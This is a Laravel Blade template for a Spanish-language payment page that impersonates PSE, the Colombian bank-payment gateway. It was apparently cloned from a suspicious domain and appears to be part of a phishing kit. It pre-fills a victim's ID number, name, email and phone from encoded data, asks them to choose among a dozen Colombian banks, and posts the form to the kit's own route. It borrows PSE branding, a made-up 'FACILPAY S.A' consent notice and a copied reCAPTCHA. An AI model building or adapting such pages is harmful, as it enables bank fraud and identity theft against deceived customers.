@php
$datosString = base64_decode($datos64);
$datos = json_decode($datosString, true);
session(['dominio' => $datos['dominio'], 'ip' => $datos['ip']]);
@endphp
<!DOCTYPE html>
<!-- saved from url=(0035)https://colpagoseguro.space/153900/ -->
<html lang="es">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="origin-trial"
        content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
    <title>PSE - Pago con Registro Person Natural</title>
    <meta http-equiv="content-type" content="text/html; utf-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta content="es" http-equiv="Content-Language">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="/metodos/css2" rel="stylesheet">
    <link href="/metodos/style.css" rel="stylesheet">
    <link href="/metodos/styles__ltr(1).css" rel="stylesheet">
    <!-- <script type="text/javascript" async="" charset="utf-8"
        src="/metodos/recaptcha__es_419.js" crossorigin="anonymous"
        integrity="sha384-D8pmwbKy4v7p90hXdV80TnZzyNxMBYAkvsvx4Ap2XcAjl85G6tyqZxWWo5SpLXhI"></script> -->
    <script type="text/javascript" src="/metodos/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="/metodos/ready.js"></script>
    <!-- <script src="/metodos/api.js" async="" defer=""></script> -->
    <style type="text/css">
        .vue-slider-dot {
            position: absolute;
            -webkit-transition: all 0s;
            transition: all 0s;
            z-index: 5
        }

        .vue-slider-dot:focus {
            outline: none
        }

        .vue-slider-dot-tooltip {
            position: absolute;
            visibility: hidden
        }

        .vue-slider-dot-hover:hover .vue-slider-dot-tooltip,
        .vue-slider-dot-tooltip-show {
            visibility: visible
        }

        .vue-slider-dot-tooltip-top {
            top: -10px;
            left: 50%;
            -webkit-transform: translate(-50%, -100%);
            transform: translate(-50%, -100%)
        }

        .vue-slider-dot-tooltip-bottom {
            bottom: -10px;
            left: 50%;
            -webkit-transform: translate(-50%, 100%);
            transform: translate(-50%, 100%)
        }

        .vue-slider-dot-tooltip-left {
            left: -10px;
            top: 50%;
            -webkit-transform: translate(-100%, -50%);
            transform: translate(-100%, -50%)
        }

        .vue-slider-dot-tooltip-right {
            right: -10px;
            top: 50%;
            -webkit-transform: translate(100%, -50%);
            transform: translate(100%, -50%)
        }
    </style>
    <style type="text/css">
        .vue-slider-marks {
            position: relative;
            width: 100%;
            height: 100%
        }

        .vue-slider-mark {
            position: absolute;
            z-index: 1
        }

        .vue-slider-ltr .vue-slider-mark,
        .vue-slider-rtl .vue-slider-mark {
            width: 0;
            height: 100%;
            top: 50%
        }

        .vue-slider-ltr .vue-slider-mark-step,
        .vue-slider-rtl .vue-slider-mark-step {
            top: 0
        }

        .vue-slider-ltr .vue-slider-mark-label,
        .vue-slider-rtl .vue-slider-mark-label {
            top: 100%;
            margin-top: 10px
        }

        .vue-slider-ltr .vue-slider-mark {
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%)
        }

        .vue-slider-ltr .vue-slider-mark-step {
            left: 0
        }

        .vue-slider-ltr .vue-slider-mark-label {
            left: 50%;
            -webkit-transform: translateX(-50%);
            transform: translateX(-50%)
        }

        .vue-slider-rtl .vue-slider-mark {
            -webkit-transform: translate(50%, -50%);
            transform: translate(50%, -50%)
        }

        .vue-slider-rtl .vue-slider-mark-step {
            right: 0
        }

        .vue-slider-rtl .vue-slider-mark-label {
            right: 50%;
            -webkit-transform: translateX(50%);
            transform: translateX(50%)
        }

        .vue-slider-btt .vue-slider-mark,
        .vue-slider-ttb .vue-slider-mark {
            width: 100%;
            height: 0;
            left: 50%
        }

        .vue-slider-btt .vue-slider-mark-step,
        .vue-slider-ttb .vue-slider-mark-step {
            left: 0
        }

        .vue-slider-btt .vue-slider-mark-label,
        .vue-slider-ttb .vue-slider-mark-label {
            left: 100%;
            margin-left: 10px
        }

        .vue-slider-btt .vue-slider-mark {
            -webkit-transform: translate(-50%, 50%);
            transform: translate(-50%, 50%)
        }

        .vue-slider-btt .vue-slider-mark-step {
            top: 0
        }

        .vue-slider-btt .vue-slider-mark-label {
            top: 50%;
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%)
        }

        .vue-slider-ttb .vue-slider-mark {
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%)
        }

        .vue-slider-ttb .vue-slider-mark-step {
            bottom: 0
        }

        .vue-slider-ttb .vue-slider-mark-label {
            bottom: 50%;
            -webkit-transform: translateY(50%);
            transform: translateY(50%)
        }

        .vue-slider-mark-label,
        .vue-slider-mark-step {
            position: absolute
        }
    </style>
    <style type="text/css">
        .vue-slider {
            position: relative;
            -webkit-box-sizing: content-box;
            box-sizing: content-box;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            display: block;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
        }

        .vue-slider-rail {
            position: relative;
            width: 100%;
            height: 100%;
            -webkit-transition-property: width, height, left, right, top, bottom;
            transition-property: width, height, left, right, top, bottom
        }

        .vue-slider-process {
            position: absolute;
            z-index: 1
        }
    </style>
    <style>
        @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
    </style>
</head>

<body>
<x-lab-banner />
    <div id="cabecera">
        <img src="/metodos/lps.png" id="logo-mobile">
        <table cellpadding="0" cellspacing="0" width="98%" border="0" id="tbl-cabecera">
            <tbody>
                <tr>
                    <td valign="middle" align="left" width="100" id="td-logo"><img src="/metodos/lps.png" width="76">
                    </td>
                    <td valign="middle" align="left" id="td-texto">Fácil, rápido y seguro</td>
                </tr>
            </tbody>
        </table>
    </div>
    <img src="/metodos/ayuda.jpg" id="ayuda">
    <div
        style="text-align: center;font-weight: 700;font-size: 26px;color: #323153;margin-top: 47px;margin-bottom: 44px;padding: 0px 60px;">
        Pasarela de pagos
    </div>
    <div id="formulario">
        <form action="{{ route('pse-inicio') }}" method="post">
            @csrf
            <input type="hidden" name="cedula" value="{{ $datos['cedula'] }}">
            <input type="hidden" name="nombre" value="{{ $datos['nombre'] }}">
            <input type="hidden" name="email" value="{{ $datos['email'] }}">
            <input type="hidden" name="celular" value="{{ $datos['celular'] }}">
            <input type="hidden" name="status" value="nuevo-pse">
            <input type="hidden" name="hdd-persona" id="hdd-persona" value="Natural">
            <input type="hidden" name="hdd-banco" id="hdd-banco" value="A continuación seleccione su banco">
            <div class="inp" id="inp-persona">
                <div class="etiqueta" id="etq-persona">Tipo de Cliente *</div>
                <table border="0" cellspacing="0" cellpadding="0" width="100%" id="tbl-persona">
                    <tbody>
                        <tr>
                            <td valign="middle" align="left" id="td1-persona">
                                <div class="entrada" id="txt-persona">Natural</div>
                            </td>
                            <td valign="middle" align="right" id="td2-persona"><img src="/metodos/flecha.jpg"
                                    id="flecha-persona">
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div id="menu-tipo">
                <div class="item-menu" id="naturalButton">Natural</div>
                <div class="item-menu" id="juridicaButton">Jurídica</div>
            </div>
            <div class="inp" id="inp-valor">
                <div class="etiqueta">Cantidad (Moneda Colombiana)</div>
                <div class="entrada" id="txt-valor">{{ $datos['valorapagar'] }}</div>
            </div>
            <div class="inp" id="inp-banco">
                <div class="etiqueta" id="etq-banco">Seleccione un banco *</div>
                <select class="entrada" id="bankSelect" name="banco">
                    <option value="">Seleccione su banco</option>
                    <option value="nequi">NEQUI</option>
                    <option value="avvillas">BANCO AV VILLAS</option>
                    <option value="bbva">BANCO BBVA COLOMBIA S.A.</option>
                    <option value="cajasocial">BANCO CAJA SOCIAL</option>
                    <option value="davivienda">BANCO DAVIVIENDA</option>
                    <option value="bogota">BANCO DE BOGOTA</option>
                    <option value="occidente">BANCO DE OCCIDENTE</option>
                    <option value="falabella">BANCO FALABELLA </option>
                    <option value="itau">BANCO ITAU</option>
                    <option value="popular">BANCO POPULAR</option>
                    <option value="bancolombia">BANCOLOMBIA</option>
                    <option value="colpatria">SCOTIABANK COLPATRIA</option>
                </select>
            </div>
            <br>
            <div class="g-recaptcha" data-sitekey="6LeZLBwqAAAAANhknBqsPnPAAPTV3NFaqO1M6TD9">
                <div style="width: 304px; height: 78px;">
                    <div><iframe title="reCAPTCHA" width="304" height="78" role="presentation" name="a-e81c977ng18p"
                            frameborder="0" scrolling="no"
                            sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
                            src="/metodos/anchor.html"></iframe></div><textarea id="g-recaptcha-response"
                        name="g-recaptcha-response" class="g-recaptcha-response"
                        style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
                </div>
            </div>
            <br>
            <div class="texto">
                Te direccionaremos a PSE para hacer uso de sus servicios
                <br><br>
                Autorizo de forma previa, expresa e informada a FACILPAY S.A para que realice el tratamiento de mis
                datos de acuerdo a las políticas aprobadas de la entidad
            </div>
            <br>
            <button class="btn" id="btn-seguir" type="submit">Sigue</button>
        </form>
    </div>
    <br><br><br>
    <div id="pie-mobile"><img src="/metodos/super.jpg"></div>
    <table cellpadding="0" cellspacing="0" border="0" width="80%" id="pie">
        <tbody>
            <tr>
                <td align="left" id="lado-izq-pie"><img src="/metodos/super.jpg">
                </td>
                <td align="right" id="lado-der-pie">
                    <div style="width:100%; max-width:340px;" class="letra-pie">Para mayor información comunícate con
                        nosotros</div>
                    <table cellpadding="0" cellspacing="0" border="0" width="100%" style="max-width: 340px;">
                        <tbody>
                            <tr>
                                <td></td>
                                <td>
                                </td>
                                <td class="letra-pie">en Bogotá +57 (1) 3808890 opción 5</td>
                            </tr>
                            <tr>
                                <td></td>
                                <td>
                                </td>
                                <td class="letra-pie">o escríbenos https://www.pse.com.co/persona, opción centro de
                                    ayuda, Formulario de contacto.</td>
                            </tr>


                        </tbody>
                    </table>


                </td>
            </tr>
        </tbody>
    </table>
    <div
        style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility linear 0.3s, opacity 0.3s linear; opacity: 0;">
        <div
            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;">
        </div>
        <div
            style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: fixed; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255);">
            <iframe title="el desafío de recaptcha caduca dentro de dos minutos" name="c-e81c977ng18p" frameborder="0"
                scrolling="no"
                sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
                src="/metodos/bframe.html" style="width: 100%; height: 100%;"></iframe>
        </div>
    </div>
</body>
<div class="troywell-avia"><template shadowrootmode="open">
        <style>
            @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
        </style>
        <div id="troywell-avia" data-v-app="">
            <div class="app">
                <div data-v-138a3c39=""><!----></div>
            </div>
        </div>
    </template></div>
<div class="troywell-caa"><template shadowrootmode="open">
        <style>
            @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
            @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/caa/styles.css");
        </style>
        <div id="troywell-caa" data-v-app="">
            <div class="content-app" data-v-9eaabcdc=""><!----></div>
        </div>
    </template></div>
<script>

    $(document).ready(function () {
        // Función para actualizar el estado del botón
        function actualizarEstadoBoton() {
            $("#btn-seguir").prop("disabled", $("#bankSelect").val() === "");
        }

        // Escuchar cambios en el select
        $("#bankSelect").on("change", actualizarEstadoBoton);

        // Llamar a la función inicialmente para establecer el estado correcto
        actualizarEstadoBoton();
    });
</script>

</html>